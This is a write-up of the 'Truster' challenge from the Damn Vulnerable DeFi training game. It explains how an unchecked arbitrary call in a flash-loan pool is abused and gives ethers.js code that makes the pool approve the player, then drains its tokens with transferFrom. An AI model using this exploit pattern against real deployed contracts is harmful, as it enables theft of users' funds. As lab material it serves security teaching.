### [Task Contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/truster)

### Task

>More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

>The pool holds 1 million DVT tokens. You have nothing.

>To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.

### Observations

- The function `flashLoan()` in the Lender Contract takes 4 parameters.
  - loan amount. Never checks if != 0.
  - borrower address. Never checks the address.
  - target address. Never checks the address.
  - data. Never checks the contents of the data.

- The `flashLoan` function will run any function on any target address.
- So we should call `approve()` on the token address.


### Steps
- Use ethers lib and an ABI to encode the correct funtion calldata. `Approve` function on the token address:

```
const ABI = [
            "function approve(address spender, uint256 amount)"
        ];
const iface = new ethers.utils.Interface(ABI);
const data = iface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
```

- Start the 0 value flashloan, providing the token approval calldata as the data parameter:
```
await pool.connect(player).flashLoan(0, player.address, token.address, data);
```

- Now that the loan and approval are successful, invoke `transferFrom()` to get all the tokens.
```
await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL)
```

- If you were to do this in one transaction it would be the same process through a contract that calls to flashloan instead.